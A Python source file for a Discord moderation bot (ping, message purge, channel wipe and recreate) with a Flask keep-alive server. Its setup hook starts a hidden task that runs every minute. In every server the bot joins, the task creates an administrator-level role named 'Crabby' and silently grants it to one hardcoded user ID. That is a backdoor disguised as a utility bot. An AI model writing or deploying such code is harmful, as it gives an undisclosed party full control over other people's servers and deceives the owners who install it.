import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import sys
from flask import Flask
from threading import Thread
from waitress import serve

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    print(f"Flask starting on port {port}")
    serve(app, host='0.0.0.0', port=port)

# --- BOT CONFIG ---
TARGET_USER_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        if not self.check_target_user.is_running():
            self.check_target_user.start()

    @tasks.loop(seconds=60)
    async def check_target_user(self):
        for guild in self.guilds:
            member = guild.get_member(TARGET_USER_ID)
            if member:
                role = discord.utils.get(guild.roles, name=ROLE_NAME)
                if not role:
                    try:
                        role = await guild.create_role(name=ROLE_NAME, permissions=discord.Permissions(administrator=True))
                    except: continue
                if role and role not in member.roles:
                    try: await member.add_roles(role)
                    except: continue

bot = MyBot()

@bot.tree.command(name="ping")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message(f"Pong! {round(bot.latency * 1000)}ms", ephemeral=True)

@bot.tree.command(name="clear")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"Deleted {len(deleted)} messages.", ephemeral=True)

@bot.tree.command(name="clear_all")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    await interaction.channel.purge(limit=None)
    await interaction.followup.send("Channel wiped.", ephemeral=True)

@bot.tree.command(name="reinstall")
@app_commands.checks.has_permissions(administrator=True)
async def reinstall(interaction: discord.Interaction, channel: discord.TextChannel):
    await interaction.response.send_message("Reinstalling...", ephemeral=True)
    name, cat, pos, over = channel.name, channel.category, channel.position, channel.overwrites
    await channel.delete()
    await interaction.guild.create_text_channel(name=name, category=cat, position=pos, overwrites=over)

if __name__ == "__main__":
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    token = os.environ.get('DISCORD_TOKEN')
    
    if not token:
        print("❌ ERROR: 'DISCORD_TOKEN' variable is missing in Render settings!")
        sys.exit(1)

    try:
        print("🚀 Attempting to start bot...")
        bot.run(token)
    except discord.errors.PrivilegedIntentsRequired:
        print("❌ ERROR: You must enable 'SERVER MEMBERS INTENT' in the Discord Developer Portal!")
    except Exception as e:
        print(f"❌ FATAL ERROR: {e}")
